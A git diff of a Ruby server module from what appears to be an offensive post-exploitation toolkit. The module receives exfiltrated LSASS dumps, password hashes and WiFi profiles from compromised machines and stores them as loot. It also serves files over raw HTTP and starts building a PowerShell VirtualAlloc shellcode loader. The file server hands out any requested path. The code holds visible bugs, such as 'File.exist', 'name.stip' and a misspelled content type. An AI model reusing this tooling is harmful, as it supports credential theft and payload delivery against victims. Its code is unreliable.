@@ -2,6 +2,7 @@
 require 'socket'
 require 'openssl'
 require 'core'
+require 'uri'
 include Core::Commands
 module Server
   class Setup
@@ -44,6 +45,14 @@ module Server
       end
       choice.downcase[0] == 'y' ? true : false
     end
+
+    def host_listener?
+      choice = ''
+      until choice.downcase[0] == 'y' || choice.downcase[0] == 'n'
+        choice = rgets('Host listener? [y/n]: ', 'y')
+      end
+      choice.downcase[0] == 'y' ? true : false
+    end
   end
 
   class Start
@@ -58,121 +67,69 @@ module Server
         @server = TCPServer.open(port.to_i)
       end
     end
-    # TODO: combine hash, and lass getting of files
-    def hash
-      x = 0
-      loop do
-        Thread.start(@server.accept) do |client|
-          print_info("Client Connected.\n")
-          file_name = client.gets
-          print_success("Got #{file_name.strip} file!\n")
-          print_info("Getting Data!\n")
-          out_put = client.gets
-          print_info("Writing to File\n")
-          File.open("#{loot_dir}#{file_name.strip}#{x}", 'w') do |f|
-            f.write(Base64.decode64(out_put))
-          end
-          print_success("File Done!\n")
-          if file_name == "sys\r\n"
-            print_info("Trying to print Hashes!\n")
-            print_hashes(x)
-            x += 1
-          end
-        end
-      end
-    rescue => error
-      print_error(error)
-    end
 
-    def lsass
-      x = 0
+    def listener(type)
       loop do
         Thread.start(@server.accept) do |client|
           print_info("Client Connected.\n")
           file_name = client.gets
-          print_success("Got #{file_name.strip} file!\n")
+          file_name = _clean_name(file_name)
+          print_success("Got #{file_name} file!\n")
           print_info("Getting Data\n")
           out_put = client.gets
           print_info("Writing to File\n")
-          File.open("#{loot_dir}#{file_name.strip}#{x}.dmp", 'w') do |f|
+          case type
+          when 'lsass'
+            file_name = "#{file_name}_#{_timestamp}.dmp"
+          when 'wifi'
+            file_name = "#{file_name}_#{_timestamp}.xml"
+          else
+            file_name = "#{file_name}_#{_timestamp}"
+          end
+          File.open("#{loot_dir}#{file_name}", 'w') do |f|
             f.write(Base64.decode64(out_put))
           end
           print_success("File Done!\n")
-          x += 1
+          client.close
         end
       end
     rescue => error
       print_error(error)
     end
 
-    def wifi
+    def host_file
+      time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
       loop do
         Thread.start(@server.accept) do |client|
-          file_name = client.gets
-          print_success("Got #{file_name.strip} file!")
-          print_info('Getting Data')
-          out_put = client.gets
-          print_info('Writing to File')
-          File.open("#{loot_dir}#{file_name.strip}.xml", 'w') do |f|
-            f.write(Base64.decode64(out_put))
-          end
-          print_success('File Done!')
-        end
-      end
-    rescue => error
-      print_error(error)
-    end
-
-    def web
-      print_info('Checking for Apache')
-      sleep(2)
-      if File.exist?('/usr/sbin/apache2')
-        if File.exist?('/usr/sbin/service')
-          @service_check = `service apache2 status`
-        else
-          print_error("Can't Find Startup Service")
-          exit
-        end
-      elsif File.exist?('/usr/sbin/apachectl')
-        if File.exist?('/usr/bin/systemctl')
-          @systemd_check = `systemctl status httpd`
-        else
-          print_error("Can't Find Startup Service")
-          exit
-        end
-      else
-        print_error("Can't Find Apache!\n")
-        exit
-      end
-      if @systemd_check =~ /inactive/ || @service_check =~ /NOT running/
-        print_info('Starting Server')
-        if File.exist?('/usr/bin/systemctl')
-          out_put = `systemctl start httpd 2>&1`
-          if out_put =~ /Access denied/
-            print_error('Access Denied, Not Running as Root')
-            exit
+          request = client.gets
+          request_uri = request.split(' ')[1]
+          path = URI.unescape(URI(request_uri).path)
+          if File.exist(path) && !File.directory?(path)
+            File.open(path) do |f|
+              headers = ['HTTP/1.1 200 OK',
+                         "Date: #{time}",
+                         'Server: Ruby',
+                         'Content-Type: applicaiton/octet-stream; charset=iso-8859-1',
+                         "Content-Length: #{f.size}\r\n\r\n"].join("\r\n")
+              client.print headers
+              IO.copy_stream(f, client)
+            end
           else
-            print_success('Server Started!')
-            sleep(2)
+            message = "File not found\n"
+            headers = ['HTTP/1.1 404 Not Found',
+                       "Date: #{time}",
+                       'Server: Ruby',
+                       'Content-Type: text/plain; charset=iso-8859-1',
+                       "Content-Length: #{message.size}\r\n\r\n"].join("\r\n")
+            client.print headers
+            client.print message
           end
-        elsif File.exist?('/usr/sbin/service')
-          `service apache2 start`
-          print_success('Server Started!')
-          sleep(2)
-        else
-          print_error('Could Not Start Apache!')
-          exit
+          client.close
         end
-      elsif @systemd_check =~ /active/ || @service_check =~ /running/
-        print_info('Server Already Running!')
-        sleep(2)
       end
-    rescue => error
-      print_error("#{error}\n")
-      exit
     end
 
-    def ruby_web(shellcode)
+    def host_raw(shellcode)
       time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
       s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
       s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
@@ -214,5 +171,15 @@ module Server
       print_info('Caught CTRL-C stopping server!')
       exit
     end
+  end
+
+  private
+
+  def _timestamp
+    Time.now.strftime('%Y_%m_%d_%H_%M_%S')
+  end
+
+  def _clean_name(name)
+    name.stip
   end
 end
